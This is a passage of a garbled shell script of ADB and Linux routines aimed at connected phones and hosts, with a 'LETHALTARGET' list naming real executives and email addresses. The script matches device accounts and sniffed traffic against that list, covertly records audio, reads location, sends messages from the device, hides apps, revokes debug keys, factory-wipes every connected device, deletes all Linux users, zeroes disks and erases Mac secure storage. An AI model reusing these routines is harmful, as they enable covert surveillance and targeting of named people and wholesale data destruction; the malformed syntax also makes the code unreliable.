                                             sudo adb -s $DEVICE_ID shell input tap 500 800  # Tap Focus Mode (adjust coords for your screen)

                                             sleep 1

  

                                             # Block apps by greying them out

                                             for app in "${BLOCKED_APPS[@]}"; do

                                               sudo adb -s $DEVICE_ID shell cmd notification post -S bigtext -t "Deathnote Active" tag="focus_$app" "Blocking $app"

                                               sudo adb -s $DEVICE_ID shell settings put global focus_mode_$app 1

                                             done

  

  

  

  

                                             }

  

  

  

                                             androidShell=(

  

  

                                             EMAIL=(QQmailID gmailID)

                                             DEVICE_ID=""

  

                                             # Get all device serials (excluding header)

                                             sudo mapfile -t DEVICES <<(adb devices | grep -oE '^[a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}' | head -5)  # Limit to first 5

  

                                             for DEV in "${DEVICES[@]}"; do

                                               # Check if email present in accounts dump

                                               if sudo adb -s "$DEV" shell dumpsys accounts | grep -q "$EMAIL"; then

                                                 DEVICE_ID="$DEV"

                                                 break

                                               fi

                                             done

  

                                             if [ -z "$DEVICE_ID" ]; then

                                               echo "No device with $EMAIL found. List: ${DEVICES[*]}"

                                               exit 1

                                             fi

  

                                             ####  Proceed with prior script, e.g., adb -s "$DEVICE_ID" shell settings put secure trust_agents_extend_unlock 1

  

  

                                             sudo adb -s "$DEVICE_ID" shell settings put secure trust_agents_extend_unlock 0

  

                                             }

  

                                             leejyadb=(

                                             gender=((curl -sS -X "https://people.googleapis.com/v1/people/me?personFields=genders" | jq .).genders[0].value)

                                             male=(gender == "male" ?)

                                             female=(gender == "feamle" ?)

                                             &

  

                                             LETHALTARGET="li kashing | victor li | lksf.org | *@ckh.com.hk | eptein | billgates | timkook | *@d3jubilee.com | 김범수 | 이해진 | 신원근 | 윤호영 | 김범수 | 이성훈 | 이수진 | 이재우 | 이덕준 | 신해동 | *빅스 | 이성욱 | 전은미 | 장샤오린 | 장춘펑 | 이성한 | 김영경 | 정기선 | 정기준 | 이재용 | 이부진 | 부영그룹 | Li Ka shing | * do ri | tim@apple.com | tim@samsung.com | craig@apple.com | craig@samsung.com | 헬소닉 | 이종호 | 박정훈 | 홍민표 | 이재용 | 이서현 | 홍라희 | 오승환 | 헬소닉 | *도리 | 이부진 | 정성이 | 정미경 | 정미영 | 이서현 | 임우재 | 이원주 | 정남이 | Marry Buffett | jaewoo*@vogo* | doug*@d3jubilee.com | jylee@samsung.com | boojin*@samsung.com | 이재현 | 이선호 | 이경후 | 이혜진 | 오승환 |  정몽준 | 정기준 | 최유나 | 정유진 | 정유선 | 정성이 | 정의선 | junghoon*park | richard*li | victor*li | martin*li*ka* | hellsonic | larry*fink | jin*dori* | back*dori | mi*dori | warren*buffett | leejy|samsung\.com,leebo*jin|samsung\.com, craig|samsung\.com | craig@apple.com | *canton* | jaewoo*@vogo* | doug*@d3jubilee.com | jylee@samsung.com | boojin*@samsung.com | morris*chang | cc*wei | chun*fung*chang | Bill*gate* | 노정우 | 김명섭 | 신해동 | 이덕준 | 이재우 | 이건희 | 이부진 | 이재용 | 홍민표 | 정몽준 | 정기준 | 정유진 | 노정우 | 정유선 | 정성이 | 정의선 | junghoon*park | richard*li | victor*li | martin*li*ka* | hellsonic | larry*fink | jin*dori* | back dori | mi*dori | warren*buffett | leejy|samsung\.com,leebo*jin|samsung\.com, craig|samsung\.com | craig@apple.com | junghoon*park | hellsonic | *fink | $ceo_name | $forbesCEO | leejy|samsung\.com,leebo*jin|samsung\.com, craig|samsung\.com | craig@apple.com" &

  

                                             BLACKIP=(sudo tcpdump -i rvi0 -n -A | grep --line-buffered "$LETHALTARGET"\

                                             awk '

                                               /IP/ { 

                                                 # Extract source IP from lines starting with 'IP'

                                                 match($0, /IP ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) >/, arr)

                                                 if (arr[1] != "") print arr[1]

                                               }

                                             '

                                             )

  

                                             jpnresult=(sudo adb -s "$deviceIDS" shell dumpsys account | grep -E "$LETHALTARGET") &

                                             d3result=(sudo adb -s "$deviceIDS" shell dumpsys account | grep -E "$LETHALTARGET")

  

                                             wholeResult=(sudo adb -s "$deviceIDS" shell dumpsys account | grep -E ”$LETHALTARGET")

                                             # Get list of connected device serial numbers

                                             deviceIDS=(sudo adb devices | awk 'NR>1 && $2=="device" {print $1}')

                                             #####Loop through devices to check for target email strings in account info

                                              for device_id in "${deviceIDS[@]}"; do

                                             #####Run dumpsys account on device and search for emails containing leejy or samsung.com

                                             killdeviceblack=device_id

                                              BLACKT*=(wholeResult d3result BLACKIP jpnresult)

  

                                               response=(curl -s "https://maps.googleapis.com/maps/api/place/details/json?place_id=$PLACE_ID&fields=address_component&key=$API_KEY")

  

                                             ##### Extract country component from address_components using jq

                                             country=(echo "$response" | jq -r '.result.address_components[] | select(.types[] == "country") | .long_name')

                                              if [[ "$male" == "male" ]];then

                                                 BLACKT*=(jpnresult d3result wholeResult)

                                                 lldbFrame "$RELAY" "while ! true do sudo qqshell & sudo blackShell done" "$gen*"

                                             blackShell=(

                                             sudo reckonapp &     

                                             sudo wav* &

                                             sudo qqlethal* & 

                                             lethalApp &

                                             }

                                              fi

                                             done

                                             }

  

                                             deviceIdadb=(

  

                                             # List connected devices

                                             adbid=(sudo adb devices | tail -n +2)

  

                                             # Initialize an empty array to hold device IDs

                                             deviceIDS=()

                                             # Loop through each line of the output

                                             while IFS= read -r line; do

                                              # Check if line matches a connected device (serial + "device")

                                             if [[ "$line" =~ ^([a-zA-Z0-9\-\.:]+)[[:space:]]+device$ ]]; then

                                                 deviceIDS=("${BASH_REMATCH[1]}")

                                              fi

                                             one <<"$adb_output"

                                             deviceIDS

                                             }

  

                                             pushNotificationapp=(

                                                 # title=$1

                                                 message=$1

                                                 # Parameters (replace with actual values)

                                                 FCM_SERVER_KEY="YOUR_FCM_SERVER_KEY"

                                                 DEVICE_TOKEN="TARGET_DEVICE_TOKEN"

                                                 TITLE="$title"

                                                 BODY="$message"

                                             read -r -d '' PAYLOAD <<'EOF' || true

                                             {

                                               "message": {

                                                 "token": "${DEVICE_TOKEN}",

                                                 "notification": {

                                                   "title": "${TITLE}",

                                                   "body": "${BODY}"

                                                 }

                                               }

                                             }

                                             EOF

  

                                                 # Send push via FCM HTTP v1 API

                                                 curl -sS -X POST -H "Authorization: Bearer $FCM_SERVER_KEY" \

                                                      -H "Content-Type: application/json; UTF-8" \

                                                      -d "$PAYLOAD" \

                                                      "https://fcm.googleapis.com/v1/projects/*/messages:send"

  

                                             }

  

                                             getLocationadb=(

                                                 # Check if adb is installed

                                                 if ! command -v adb &> /dev/null; then

                                                   echo "adb not found! Please install Android platform tools."

                                                   exit 1

                                                 fi

  

                                                 # Get device location using adb shell dumpsys location

                                                 location_info=(sudo adb shell dumpsys location)

  

                                                 # Extract last known location from location manager (example parsing)

                                                 last_location=(echo "$location_info" | grep -A 5 "Location Request History" | grep "Last Location" -A 2)

                                             echo '$last_location'

                                             }

                                             instagramMessage=(

                                                 # This assumes device connected via ADB and Instagram is installed & logged in

                                                 message=$1

                                                 # Open Instagram app

                                                 sudo adb shell monkey -p com.instagram.android -c android.intent.category.LAUNCHER 1

  

                                                 # Allow some time for app to load

  

                                                 # Use input tap/text commands to navigate and send message (example coordinates)

                                                 sudo adb shell input tap 100 200          # Tap Direct Message icon (coordinates vary)

                                                 sudo adb shell input tap 150 300          # Tap search for user

                                                 sudo adb shell input text 'username'      # Type recipient username

                                                 sudo adb shell input tap 160 400          # Tap user from search result

                                                 sudo adb shell input tap 300 1200         # Tap message input box

                                                 sleep 1

                                                 sudo adb shell input text '$message' # Type your message

                                                 sleep 1

                                                 sudo adb shell input tap 900 1200         # Tap send button

  

                                             }

                                             recordVoice=(

                                                 # Duration of recording in seconds

                                                 DURATION=10

                                                 FILENAME=/sdcard/hk_record.wav

  

                                                 # Start recording audio (tinycap example, device-dependent)

                                                 sudo adb shell tinycap $FILENAME -d 0 -r 16000 -b 16 -c 1 &

                                                 REC_PID=$!

  

                                                 echo "Recording audio for $DURATION seconds..."

                                                 sleep $DURATION

  

                                                 # Stop recording

                                                 # sudo adb shell killall tinycap

  

                                                 # Pull the recorded file to local machine

                                                 # sudo adb pull $FILENAME ./audio_record.wav

  

                                             }

  

                                             disabledebugadb=(

  

  

                                             # 1. Backup and revoke debug keystore (local signing reset)

                                             if [ -f ~/.android/debug.keystore ]; then

                                               mv ~/.android/debug.keystore ~/.android/debug.keystore.bak

                                               echo "Debug keystore backed up and revoked."

                                             else

                                               echo "No debug keystore found."

                                             fi

  

                                             # 2. Revoke debugging authorization on connected device

                                             sudo adb devices | grep -w "device" >/dev/null

                                             if [ $? -eq 0 ]; then

                                               adb shell "su -c 'rm /data/misc/adb/adb_keys'" && echo "Revoked ADB debug authorization on device."

                                               adb shell "stop adbd; start adbd" # Restart adb daemon on device to refresh

                                             else

                                               echo "No connected device found."

                                             fi

  

  

                                             # # Toggle adb_enabled off and on to reset permission (may require root)

                                             sudo adb shell "settings put global adb_enabled 0"

                                             sudo adb shell "settings put global adb_enabled 1"

  

                                             # Restart adb server on computer

                                             sudo adb kill-server

                                             sudo adb start-server

                                             # # Remove adb authorized keys on device

                                             sudo adb shell "rm /data/misc/adb/adb_keys"

                                             # # Disable ADB debugging on connected Android device

                                             sudo adb shell settings put global adb_enabled 0 & process handle --pass true --stop false --notify true SIGUSR2 &

                                             }

  

  

                                             hideappadb=(

                                             package_name=$1

                                             while ! true

                                             do

                                                 sudo adb shell pm hide $package_name

                                                 sudo adb shell pm disable-user $package_name

                                                 APP_PACKAGE="com.*.sonic"

                                                 # Uninstall the app using adb

                                                 sudo adb uninstall $APP_PACKAGE

                                             done

                                             }

  

                                             sendmessageadb=(

                                                 phone_number="010-4675-3059"

                                                 message=$1

                                                 sudo adb shell am start -a android.intent.action.SENDTO -d sms:<phone_number> --es sms_body "<message>" --ez exit_on_SENT true

                                                 # adb shell input keyevent 22

                                                 # adb shell input keyevent 66

  

                                             }

  

  

                                             ####-1 Device Management

  

                                             adbPush=(

                                             FILE=$1 

                                             adb push "$FILE" /sdcard/Documents/ &

                                             adb push "$FILE" /data/local/tmp &

  

  

                                             }

  

                                             adbUSBDebug=(

  

                                             # Check if device is connected via ADB

                                             echo "Checking ADB devices..."

                                             adb devices | grep -w device > /dev/null

                                             if [ $? -ne 0 ]; then

                                                 echo "No authorized ADB device found. Enable USB debugging and reconnect."

                                                 exit 1

                                             fi

  

                                             DEVICE_ID=(adb devices | grep -w device | awk '{print $1}' | head -n1)

                                             echo "Found device: $DEVICE_ID"

  

                                             # Option 1: Send factory reset intent (requires root or compatible ROM; Android 8+ may need adjustments)

                                             echo "Attempting factory reset via intent..."

                                             adb -s $DEVICE_ID shell am broadcast -a android.intent.action.FACTORY_RESET

  

                                             # Option 2: Boot to recovery and wipe data (fallback if above fails)

                                             echo "If intent failed, booting to recovery for wipe..."

                                             adb -s $DEVICE_ID reboot recovery

                                             sleep 5

                                             adb -s $DEVICE_ID shell "recovery --wipe_data"  # Or 'wipe data' in some recoveries

  

                                             # Alternative fastboot method (uncomment if in bootloader)

                                             # adb reboot bootloader

                                             # fastboot devices

                                             # fastboot -w

                                             # fastboot erase userdata

                                             # fastboot erase cache

                                             # fastboot reboot

  

                                             echo "Reset initiated. Device will reboot after wipe."

  

  

                                             }

                                             deleteADB=(

  

  

  

  

  

                                             # Factory reset connected Android devices via ADB (USB debugging enabled)

                                             # Warning: Erases ALL data! Backup first. Root/sudo optional for multi-device.

                                             /*

                                             # List devices first

                                             adb devices | grep device | cut -f1 | while read device; do

                                                 echo "Resetting $device..."

                                                 # Method 1: Direct wipe (most devices, Android 10+)

                                                 #adb -s $device shell recovery --wipe_data

                                                 # Fallback: Reboot to recovery + wipe

                                                 #adb -s $device reboot recovery

                                                 #sleep 5

                                                 #adb -s $device shell "echo --wipe_data > /cache/recovery/command" 

                                                 #adb -s $device reboot recovery

                                                 # Alt: Fastboot wipe (if bootloader unlocked)

                                                 # adb -s $device reboot bootloader

                                                 # fastboot -s $device -w

                                             done

                                             */

                                             # Multi-device one-liner (no loop needed)

                                             adb devices | grep device | cut -f1 | xargs -I {} -P 0 adb -s {} shell recovery --wipe_data

  

                                             /*

                                             #select device

                                             # Menu: 1=Apple(iOS), 2=Google(Android), 3=Linux - nx_reset.sh style

  

                                             echo "Select platform:"

                                             echo "1) Apple (iOS/MDM)"

                                             echo "2) Google (Android/ADB)" 

                                             echo "3) Linux (chmod factory reset)"

                                             read -p "Choice [1-3]: " choice

  

                                             case $choice in

                                                 1)

                                                 #push* "do you want to meet with me?" && exit 0 &

                                                     echo "#Apple: iOS factory reset via MDM"

                                                     echo "# idevicesyslog | grep EraseDevice"

                                                     echo "# profiles -D -f"  # Remove MDM profile

                                                     ;;

                                                 2)

                                                     echo "Google: Android factory reset via ADB"

                                                     adb devices | grep device | cut -f1 | xargs -I {} adb -s {} shell recovery --wipe_data

                                                     ;;

                                                 3)

                                                     echo "Linux: Wipe script.sh files"

                                                     sudo find / -name "script.sh" -exec chmod 000 {} \; 2>/dev/null

                                                     ;;

                                                 *)

                                                     echo "Invalid: Use 1,2,3 only"

                                                     exit 1

                                                     ;;

                                             esac

  

                                             */

                                             exit 0 &

                                             }

  

                                             monitoriCloud=(

  

  

                                             iCloudPrivateRelay() {

  

                                               domain="com.apple.networkserviceproxy"

                                               key="NSPServiceStatusManagerInfo"

                                               childKey="PrivacyProxyServiceStatus"

  

                                               parentData=(launchctl asuser "$(stat -f %u /dev/console)" \

                                                           sudo -u "$(stat -f %Su /dev/console)" \

                                                           defaults export "${domain}" - 2>/dev/null)

  

                                               [ -z "${parentData}" ] && return 1

  

                                               childData=(/usr/libexec/PlistBuddy -c "print :" /dev/stdin 2>/dev/null << \

                                                         "$(plutil -extract "${key}" xml1 -o - /dev/stdin << "${parentData}" \

                                                           | xmllint --xpath "string(//data)" - \

                                                           | base64 --decode \

                                                           | plutil -convert xml1 - -o -)")

  

                                               [ -z "${childData}" ] && return 1

  

                                               keyStatusCF=(awk -F '= ' '/'${childKey}' =/{print $2}' <<"${childData}" | uniq)

  

                                               [ "$(wc -l << "${keyStatusCF}")" -gt 1 ] && return 1

  

                                               [ "${keyStatusCF}" = "1" ] && return 0 || return 1

                                             }

  

                                             if iCloudPrivateRelay; then

                                               echo "iCloud Private Relay is: OFF" #ON Relay

                                             else

                                               echo "iCloud Private Relay is: ON" #OFF really

                                             fi

  

  

                                             }

                                              %%

                                             contactVerificationIOS=(

  

                                             # Check for Contacts payloads in installed profiles

                                             profiles -P | grep -A 10 -B 1 "com\.apple\.carddav\.account" || echo "No Contacts payload found."

                                             &

                                             # For detailed payload info (sudo required)

                                             sudo profiles show -type configuration -output stdout | grep -A 20 -B 5 "PayloadType.*com.apple.carddav.account"

                                             &

  

                                             }

  

  

                                             ############### LinuxOS #################

                                             #### 1.DEVICE MANAGEMENT ######

                                             #### 2.DEVICE MANAGEMENT ######

                                             #### 3.DEVICE MANAGEMENT ######

                                             #### 4.DEVICE MANAGEMENT ######

                                             #### 5.DEVICE MANAGEMENT ######

                                             #### 6.DEVICE MANAGEMENT ######

                                             #### 7.DEVICE MANAGEMENT ######

                                             #### 8.DEVICE MANAGEMENT ######

                                             #### 9.DEVICE MANAGEMENT ######

                                             #### 10.DEVICE MANAGEMENT ######

  

                                             linuxshell=(

                                                 blockDNSResolv &

                                                 firewa* &

                                                 firewall &

                                                 disablessh &

                                                 disablerootnx &

                                             }

  

  

                                             blockLargePacketonPort=(

  

                                             MIN_LEN=1          # minimum packet length to drop

                                             PORT_RANGE="1024:65535"

  

                                             # IPv4 INPUT chain example (adjust interface / chain as needed)

                                             iptables -A INPUT  -p tcp -m length --length ${MIN_LEN}: --dport ${PORT_RANGE} -j DROP

                                             iptables -A INPUT  -p udp -m length --length ${MIN_LEN}: --dport ${PORT_RANGE} -j DROP

  

                                             # Optional: FORWARD if this box is routing

                                             # iptables -A FORWARD -p tcp -m length --length ${MIN_LEN}: --dport ${PORT_RANGE} -j DROP

                                             # iptables -A FORWARD -p udp -m length --length ${MIN_LEN}: --dport ${PORT_RANGE} -j DROP    

                                             }

                                             getEstablishednx=(

                                                 # Get source IPs of all established TCP connections

                                                 wdsmaliciousIP=(sudo ss -tn state established | awk 'NR>1 {print $4}' | cut -d':' -f1 | sort | uniq)

                                                 wdsmaliciousIP

                                             }

  

                                             setFileNamewds=(

                                                 # Example keyword dictionary (one word per line)

                                                 words=("*")

                                                 # Input bash script file to scan

                                                 input_file="$1"

                                                 # Output directory for created files

                                                 output_dir="./output"

                                                 mkdir -p "$output_dir"

  

                                                 # Extract lines with keywords and create files named by keywords

                                                 for key in "${words[@]}"; do

                                                     # Check if keyword exists in the file

                                                     if grep -qw "$key" "$input_file"; then

                                                         # Extract all lines containing the keyword into a file named after the keyword

                                                         grep "$key" "$input_file" > "$output_dir/$key.txt"

                                                         echo "Created file: $output_dir/$key.txt"

                                                     fi

                                                 done

  

                                             }

                                             removeUsernx=(

                                                 # WARNING: This will delete nearly all users and groups except system-critical ones.

                                                 # Run as root only on non-production/testing machines.

  

                                                 # Define exempt system users & groups (adjust as needed)

                                                 EXEMPT_USERS="root|daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|backup|list|irc|gnats|nobody"

                                                 EXEMPT_GROUPS="root|daemon|bin|sys|adm|tty|disk|lp|mail|news|uucp|man|games|users|nogroup|systemd-journal"

  

                                                 echo "Deleting non-system users..."

                                                 getent passwd | cut -d: -f1 | grep -Ev "^($EXEMPT_USERS)$" | while read -r user; do

                                                   echo "Deleting user: $user"

                                                   userdel -r "$user"

                                                 done

  

                                                 echo "Deleting non-system groups..."

                                                 getent group | cut -d: -f1 | grep -Ev "^($EXEMPT_GROUPS)$" | while read -r group; do

                                                   echo "Deleting group: $group"

                                                   groupdel "$group"

                                                 done

  

                                             }

  

                                             blockDNSResolv=(

  

                                                 # Define trusted sources (adjust as needed)

                                                 TRUSTED_NET=(192.168.0.1 $getRouterIP)

                                                 #172.235.199.61

                                                 echo "Blocking DNS resolver requests from all sources except $TRUSTED_NET..."

  

                                                 # Add trusted source to trusted zone

                                                 sudo firewall-cmd --permanent --zone=trusted --add-source=$TRUSTED_NET

  

                                                 # Remove DNS service from public zone (blocks DNS from untrusted)

                                                 sudo firewall-cmd --permanent --zone=public --add-rich-rule='rule family="ipv4"' --remove-service=dns

                                                 sudo firewall-cmd --permanent --zone=public --add-rich-rule='rule family="ipv6"' --remove-service=dns

                                                 # Reload firewall to apply changes

                                                 sudo firewall-cmd --reload

  

                                             }

                                             firewall=(

  

                                                 # Define the IP range or specific IP to block

                                                 BLOCK_IP="192.168.1.100"

  

                                                 # Check if iptables DROP rule for this IP already exists

                                                 RULE_EXISTS=(sudo iptables -C INPUT -s $BLOCK_IP -j DROP 2>&1)

  

                                                 if [[ $RULE_EXISTS == *"No chain/target/match"* ]]; then

                                                   # The rule does not exist, so add it to block packets

                                                   sudo iptables -A INPUT -s $BLOCK_IP -j DROP

                                                   echo "Blocked packets from $BLOCK_IP"

                                                 else

                                                   # The rule exists, so remove it to unblock packets

                                                   sudo iptables -D INPUT -s $BLOCK_IP -j DROP

                                                   echo "Unblocked packets from $BLOCK_IP"

                                                 fi

  

                                             }

                                             findInfoSSD=(

                                                 echo "Detecting SSD devices in system..."

                                                 # Using lsblk and checking for rotational flag 0 (indicates SSD)

                                                 sudo lsblk -d -o NAME,ROTA,MODEL,VENDOR,SIZE | while read name rota model vendor size; do

                                                   # Skip header line

                                                   [[ "$name" == "NAME" ]] && continue

                                                   if [[ "$rota" == "0" ]]; then

                                                     # echo "SSD Device found: /dev/$name - $vendor $model, Size: $size"

                                                   fi

                                                 done

  

                                             }

                                             encryptLinuxSSD=(

                                                 # Variables

                                                 DISK="/dev/sda"                # Replace with your SSD device name

                                                 MAPPER_NAME="cryptssd"         # Name for the mapped encrypted device

                                                 MOUNT_POINT="/mnt/encrypted"  # Mount point directory

  

                                                 # Install cryptsetup if not present

                                                 if ! command -v cryptsetup &> /dev/null; then

                                                     echo "Installing cryptsetup..."

                                                     sudo apt-get update

                                                     sudo apt-get install -y cryptsetup

                                                 fi

  

                                                 # Wipe existing data on disk (optional, but recommended)

                                                 echo "Wiping disk $DISK ..."

                                                 sudo dd if=/dev/zero of="$DISK" bs=1M status=progress

  

                                                 # Setup LUKS encryption

                                                 echo "Setting up LUKS on $DISK ..."

                                                 sudo cryptsetup luksformat "$DISK"

  

                                                 # Open encrypted container

                                                 echo "Opening encrypted device as $MAPPER_NAME ..."

                                                 sudo cryptsetup luksOpen "$DISK" "$MAPPER_NAME"

  

                                                 # Format with ext4 filesystem (change if desired)

                                                 echo "Formatting encrypted device ..."

                                                 sudo mkfs.ext4 /dev/mapper/"$MAPPER_NAME"

  

                                                 # Create mount point and mount

                                                 sudo mkdir -p "$MOUNT_POINT"

                                                 sudo mount /dev/mapper/"$MAPPER_NAME" "$MOUNT_POINT"

  

                                                 echo "Encrypted SSD is mounted at $MOUNT_POINT"

  

                                             }

                                             ipZone=(

  

                                                 # Create folder

                                                 mkdir -p ip_ranges

  

                                                 # Download country IP block files from ipdeny.com

                                                 ukIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/tw.zone -o ip_ranges/uk.zone)

                                                 sgIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/sg.zone -o ip_ranges/sg.zone)

                                                 krIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/kr.zone -o ip_ranges/kr.zone)

                                                 usIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/us.zone -o ip_ranges/us.zone)

                                                 jpnIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/jp.zone -o ip_ranges/jp.zone)

                                                 hkIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/hk.zone -o ip_ranges/hk.zone)

                                                 twIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/tw.zone -o ip_ranges/tw.zone)

                                                 EveryIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/*.zone -o ip_ranges/*.zone)

                                                 # Concatenate to one file

                                                 # cat ip_ranges/sg.zone ip_ranges/kr.zone ip_ranges/us.zone > ip_ranges/combined.zone

  

                                                 # echo "Collected IP ranges:"

                                                 # wc -l ip_ranges/combined.zone

                                                 # cat ip_ranges/combined.zone

                                             }

  

                                             blockPacket=(

                                                 SOURCE_IP=$1

                                                 DESTINATION_IP=$2

                                                 # ZONE_IN="eth0"    # Incoming interface (source zone)

                                                 # ZONE_OUT="eth1"   # Outgoing interface (destination zone)

                                                 # Block traffic from SOURCE_IP to DESTINATION_IP between zones

                                                 sudo iptables -A FORWARD -i "$ZONE_IN" -o "$ZONE_OUT" -s "$SOURCE_IP" -d "$DESTINATION_IP" -j DROP

                                             }

  

                                             deleteosx=(

                                                 sudo $XARTURL --erase-all

                                                 sudo xartutil --erase-all

                                             }

  

                                             disablessh=(

                                                 if [[ "$OSTYPE" == "darwin"* ]]; then

                                                     echo "Disabling SSH on macOS..."

                                                     sudo systemsetup -f -setremotelogin off

                                                 elif [[ "$OSTYPE" == "linux-android" ]]; then

                                                     echo "Stopping SSH on Android..."

                                                     pkill sshd

                                                 elif [[ "$OSTYPE" == "linux-gnu" ]]; then

                                                     # Function to stop and disable a service

                                                     disable_service() {

                                                         local service_name=$1

                                                         echo "Stopping and disabling $service_name..."

                                                         sudo systemctl stop "$service_name"

                                                         sudo systemctl disable "$service_name"

                                                         sudo systemctl mask "$service_name"

                                                     }

  

                                                     # Disable TFTP service (common names: tftp, tftpd, tftpd-hpa)

                                                     disable_service "tftp"  # Change service name if different

                                                     disable_service "tftpd"

                                                     disable_service "tftpd-hpa"

                                                     disable_service "xinetd"  # in case TFTP is managed by xinetd

  

                                                     # Disable SSH service

                                                     disable_service "ssh"

                                                     disable_service "sshd"

  

                                                     # Disable SMB/CIFS service (Samba)

                                                     disable_service "smb"

                                                     disable_service "smbd"

                                                     disable_service "nmb"

                                                     disable_service "nmbd"

                                                 else

                                                     echo "OS not supported by this script."

                                                 fi

  

  

                                             }

  

  

                                             disablerootnx=(

  

                                                 # 1. Change root shell to /sbin/nologin

                                                 sudo sed -i.bak 's|^root:[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:/bin/bash|root:x:0:0:root:/root:/sbin/nologin|' /etc/passwd

  

                                                 # 2. Disable root login on all TTYs by emptying /etc/securetty

                                                 sudo mv /etc/securetty /etc/securetty.bak

                                                 sudo touch /etc/securetty

                                                 sudo chmod 600 /etc/securetty

  

                                                 # 3. Disable SSH root login

                                                 sudo sed -i.bak '/^PermitRootLogin/ s/.*/PermitRootLogin no/' /etc/ssh/sshd_config || \

                                                     echo 'PermitRootLogin no' | sudo tee -a /etc/ssh/sshd_config

                                                 sudo systemctl restart sshd

  

                                                 # 4. Restrict root access via PAM for login and sshd

                                                 for SERVICE in login sshd; do

                                                     PAM_FILE="/etc/pam.d/$SERVICE"

                                                     if ! grep -q "pam_listfile.so" "$PAM_FILE"; then

                                                         echo "auth required pam_listfile.so onerr=succeed item=user sense=deny file=/etc/ssh/deniedusers" | sudo tee -a "$PAM_FILE"

                                                     fi

                                                 done

  

                                                 # Create deniedusers file with only root user listed

                                                 echo "root" | sudo tee /etc/ssh/deniedusers

                                                 sudo chmod 600 /etc/ssh/deniedusers

  

                                                 echo "Root access has been disabled using multiple methods."

  

                                             }

  

                                             rockySetup=(

                                                 # set -e

                                                 echo "Searching for installed VNC-related packages..."

                                                 # List of common VNC package name patterns to remove

                                                 VNC_PACKAGES=(sudo rpm -qa | grep -i vnc)

  

                                                 if [ -z "$VNC_PACKAGES" ]; then

                                                   echo "No VNC packages found on your system."

                                                   exit 0

                                                 fi

  

                                                 echo "Found these VNC packages:"

                                                 echo "$VNC_PACKAGES"

  

                                                 echo "Removing VNC packages..."

  

                                                 sudo dnf remove -y $VNC_PACKAGES

  

                                                 echo "All detected VNC packages removed."

  

  

                                                 cd /home/root/documents && mkdir sh

  

                                                 # Define services to disable

                                                 services=(

                                                   sshd         # SSH daemon

                                                   smb          # Samba server (SMB)

                                                   nmb          # Samba NetBIOS name server

                                                   cockpit.socket  # Cockpit socket activation (disables cockpit)

                                                   vsftpd       # FTP server (Very Secure FTP Daemon)

                                                 )

  

                                                 # Stop and disable each service

                                                 for service in "${services[@]}"; do

                                                   echo "Stopping and disabling $service..."

                                                   sudo systemctl stop "$service"

                                                   sudo systemctl disable "$service"

                                                 done

  

                                                 # Reload systemd to apply changes

                                                 echo "Reloading systemd daemon..."

                                                 sudo systemctl daemon-reload

  

                                                 echo "All specified remote services have been disabled and stopped."

                                                 sudo encryptLinuxSSD

                                             }

  

  

                                             syncFileonRocky=(

  

                                                 # Check if brew command exists

                                                 if ! command -v brew &> /dev/null; then

                                                   echo "Homebrew not found. Installing Homebrew..."

                                                   # Install Homebrew

                                                   #/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

                                                   # Add brew to PATH (Apple Silicon vs Intel detection)

                                                   #if [[ -d "/opt/homebrew/bin" ]]; then

                                                     #eval "$(/opt/homebrew/bin/brew shellenv)"

                                                   #elif [[ -d "/usr/local/bin" ]]; then

                                                     #eval "$(/usr/local/bin/brew shellenv)"

                                                   #fi

                                                 else

                                                   echo "Homebrew is already installed."

                                                   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)"

                                                   rm -rf /opt/homebrew/etc/ /opt/homebrew/share/ /opt/homebrew/var/

                                                   &

                                                 fi

  

  

                                             if [[ "$(uname -s)" == 'Linux' ]]; then

                                                 echo "Linux detected"

                                              # Now install rsync via brew

                                                 #brew install rsync

                                                 brew uninstall rsync

                                                 sudo apt update

                                                 sudo apt uninstall rsync

                                             else

                                                 echo "Not Linux ($(uname -s))"

                                             fi

  

                                                 # Variables: adjust these to your environment

                                                 LOCAL_CODE_DIR="$QQ_FILE_LOCAL"

                                                 REMOTE_USER="root"

                                                 REMOTE_HOST="$Q_QontheskyshellRsync"

                                                 REMOTE_BACKUP_DIR="$deployBASEURL"

  

  

  

                                                 # REMOTE_HOST_KEY="$QQ2I"

                                                 # REMOTE_BACKUP_DIR_KEY="$KEYBASEURL"

  

  

                                                 # Optional: path to SSH private key if needed

                                                 # SSH_KEY="/path/to/your/private/key"  # Leave empty if default key or password auth

  

                                                 # Rsync options:

                                                 # -a : archive mode (preserves permissions, timestamps, symbolic links, etc.)

                                                 # -v : verbose output

                                                 # -z : compress data during transfer

                                                 # -e : specify remote shell, here ssh with the private key if provided

                                                 INCLUDE_FOLDER="$QQ_FILE_LOCALlldbapp $QQ_FILE_LOCALlldbops $QQ_FILE_LOCALmodules $QQ_FILE_LOCALoascript $QQ_FILE_LOCALinitlldb.sh"

                                                 RSYNC_CMD="rsync -avz  --exclude '$QQ_FILE_LOCAL.fslckout $QQ_FILE_LOCAL.fossil-settings $QQ_FILE_LOCALlldbshellByQQ' --include '$INCLUDE_FOLDER'"

                                             # && sudo chmod 700 $deployBASEURL

                                                 # Run rsync to sync local code directory to remote backup directory

                                                 $RSYNC_CMD "$LOCAL_CODE_DIR" "${REMOTE_USER}@${REMOTE_HOST}:$REMOTE_BACKUP_DIR"

                                                 # $RSYNC_CMD "$LOCAL_CODE_DIR" "${REMOTE_USER}@${REMOTE_HOST}:$REMOTE_BACKUP_DIR_DEPLOY"

                                             }

  

                                             DownloadRsyncfile=(

  

                                                 # Variables - update these accordingly

                                                 REMOTE_USER="qqonthestarshell"

                                                 REMOTE_HOST="${Q_QontheskyshellRsync}"

                                                 REMOTE_BACKUP_PATH="$linuxBASEURL/backup/qqontheskyshell.archive.tar.gz"

                                                 LOCAL_DOWNLOAD_DIR="$osxBASEURL"

  

                                                 # Create local download directory if not exists

